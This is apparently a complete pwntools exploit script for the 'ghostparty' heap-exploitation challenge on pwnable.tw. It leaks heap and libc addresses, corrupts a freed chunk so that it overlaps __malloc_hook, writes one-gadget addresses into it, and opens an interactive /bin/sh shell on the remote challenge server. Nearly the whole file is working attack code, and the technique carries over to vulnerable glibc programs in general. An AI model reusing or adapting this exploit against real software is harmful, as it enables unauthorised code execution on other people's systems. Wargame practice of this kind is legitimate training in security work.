#!/usr/bin/env python3
from pwn import *
import shutil
sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)
slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())
ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rnt = lambda p, n, t: p.recvn(n, timeout=t)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()
lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda l, c: c * l
z = lambda l: l * b'\0'
A = lambda l: l * b'A'

e = context.binary = ELF('./ghostparty_patched', checksec=False)
libc = ELF('./libc_64.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

TERMINAL = 0
USE_PTY = False
GDB_ATTACH_DELAY = 1
ALLOW_MEM = 0

_wsl_distro = os.environ.get("WSL_DISTRO_NAME", "Ubuntu")
terms = {
    1: ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"],
    2: ["tmux", "split-window", "-h"],
    3: ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe",
        "-w", "0", "split-pane", "-V", "-s", "0.5",
        "wsl.exe", "-d", _wsl_distro, "bash", "-c"],
}

if TERMINAL == 0:
    if shutil.which("tilix"):
        context.terminal = terms[1]
    elif os.path.exists("/proc/version") and "microsoft" in open("/proc/version").read().lower():
        context.terminal = terms[3]
    elif shutil.which("tmux"):
        context.terminal = terms[2]
    else:
        raise ValueError("Auto-detect failed: none of tilix, wsl2, tmux found")
elif TERMINAL in terms:
    context.terminal = terms[TERMINAL]
else:
    raise ValueError(f"Unknown terminal: {TERMINAL}")

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
# brva 0x5AF0
# brva 0x5CFD
# brva 0x5CAF
# brva 0x5BCB
# brva 0xAF40
# brva 0xAF13
# brva 0x6677
# brva 0x51AC
# brva 0x5032
# brva 0x5006
# brva 0x3A36
# brva 0x5269
# b *__libc_malloc
brva 0x5040
continue
'''

def attach(p):
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        sleep(GDB_ATTACH_DELAY)

def _mem_limit():
    if ALLOW_MEM > 0:
        import resource
        limit = int(ALLOW_MEM * 1024 ** 3)
        resource.setrlimit(resource.RLIMIT_AS, (limit, limit))

def conn():
    if args.LOCAL:
        if USE_PTY:
            p = process([e.path], stdin=PTY, stdout=PTY, stderr=PTY, preexec_fn=_mem_limit)
        else:
            p = process([e.path], preexec_fn=_mem_limit)
        sleep(0.25)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10401
        return remote(host, port)

MENU_ADD    = b'1'
MENU_INFO   = b'2'
MENU_NIGHT  = b'3'
MENU_REMOVE = b'4'
MENU_EXIT   = b'5'

JOIN        = b'1'
GIVEUP      = b'2'
JOIN_SPEAK  = b'3'



WEREWOLF  = b'1'
DEVIL     = b'2'
ZOMBIE    = b'3'
SKULL     = b'4'
MUMMY     = b'5'
DULLAHAN  = b'6'
VAMPIRE   = b'7'
YUKI      = b'8'
KASA      = b'9'
ALAN      = b'10'

def menu(choice):
    sla(p, b'Your choice :', choice)

def _ghost_header(name, age, msg, gtype):
    sla(p, b'Name : ', name)
    sla(p, b'Age : ', str(age).encode())
    sla(p, b'Message : ', msg)
    sla(p, b'Choose a type of ghost :', gtype)

def add_werewolf(name, age, msg, trans, join=JOIN):
    menu(MENU_ADD)
    _ghost_header(name, age, msg, WEREWOLF)
    sla(p, b'Full moon ? (1:yes/0:no):', str(trans).encode())
    sla(p, b'Your choice : ', join)

def add_devil(name, age, msg, power, join=JOIN):
    menu(MENU_ADD)
    _ghost_header(name, age, msg, DEVIL)
    sla(p, b'Add power : ', power)
    sla(p, b'Your choice : ', join)

def add_zombie(name, age, msg, join=JOIN):
    menu(MENU_ADD)
    _ghost_header(name, age, msg, ZOMBIE)
    sla(p, b'Your choice : ', join)

def add_skull(name, age, msg, bones, join=JOIN):
    menu(MENU_ADD)
    _ghost_header(name, age, msg, SKULL)
    sla(p, b'How many bones ? : ', str(bones).encode())
    sla(p, b'Your choice : ', join)

def add_mummy(name, age, msg, bandage, join=JOIN):
    menu(MENU_ADD)
    _ghost_header(name, age, msg, MUMMY)
    sla(p, b'Commit on bandage : ', bandage)
    sla(p, b'Your choice : ', join)

def add_dullahan(name, age, msg, weapon, join=JOIN):
    menu(MENU_ADD)
    _ghost_header(name, age, msg, DULLAHAN)
    sla(p, b'Give a weapon : ', weapon)
    sla(p, b'Your choice : ', join)

def add_vampire(name, age, msg, blood, join=JOIN):
    menu(MENU_ADD)
    _ghost_header(name, age, msg, VAMPIRE)
    sla(p, b'Add blood :', blood)
    sla(p, b'Your choice : ', join)

def add_yuki(name, age, msg, cold, join=JOIN):
    menu(MENU_ADD)
    _ghost_header(name, age, msg, YUKI)
    sla(p, b'Cold :', cold)
    sla(p, b'Your choice : ', join)

def add_kasa(name, age, msg, foot, eyes, echo, join=JOIN):
    menu(MENU_ADD)
    _ghost_header(name, age, msg, KASA)
    sla(p, b'foot number :', str(foot).encode())
    sla(p, b'Eyes : ', eyes)
    sa(p, b'Input to echo :', echo)
    sla(p, b'Your choice : ', join)

def add_alan(name, age, msg, lightsaber, join=JOIN):
    menu(MENU_ADD)
    _ghost_header(name, age, msg, ALAN)
    sla(p, b'Your lightsaber : ', lightsaber)
    sla(p, b'Your choice : ', join)

def show_info(idx):
    menu(MENU_INFO)
    sla(p, b'Choose a ghost which you want to show in the party : ', str(idx).encode())

def remove_ghost(idx):
    menu(MENU_REMOVE)
    sla(p, b'Choose a ghost which you want to remove from the party : ', str(idx).encode())

def night_parade():
    menu(MENU_NIGHT)

def shell(name, age, msg, lightsaber, join=JOIN):
    menu(MENU_ADD)
    _ghost_header(name, age, msg, VAMPIRE)

attempt = 0
while True:
    attempt += 1
    print("\n----------> Attempt", attempt)
    
    p = conn()

    add_alan(b'alan', 1, b'A', A(0x100))
    show_info(0)
    ru(p, b'Lightsaber : ')
    heap_base = leak_bytes(rn(p, 6), 0x12c30)
    lg("heap base", heap_base)
    add_alan(b'alan', 1, b'A', A(0x100))
    show_info(0)
    ru(p, b'Lightsaber : ')
    libc.address = leak_bytes(rn(p, 6), 0x3c3b78)
    lg("libc base", libc.address)

    add_vampire(b'vampire', 1, b'A', A(0x60))
    add_vampire(b'vampire', 1, b'A', A(0x60), JOIN_SPEAK)
    remove_ghost(2)
    remove_ghost(2)
    add_vampire(b'vampire', 1, b'A', b'A')

    # input("overwrite to hook")
    pl = flat(z(0x13-0x8-0x8) + p64(libc.address + 0xf0567) + p64(libc.symbols['memalign']) + p64(libc.address + 0x85A85)).ljust(0x60, b'\0')[:-5] + p64(heap_base + 0x12d70)[:4]
    add_vampire(p64(libc.symbols['__malloc_hook'] - 0x23).ljust(0x60, b'A'), 1, b'A', pl)

    attach(p)
    shell(b'/bin/sh', 1, b'A', A(0x100), JOIN_SPEAK)

    ia(p)
    p.close()
    break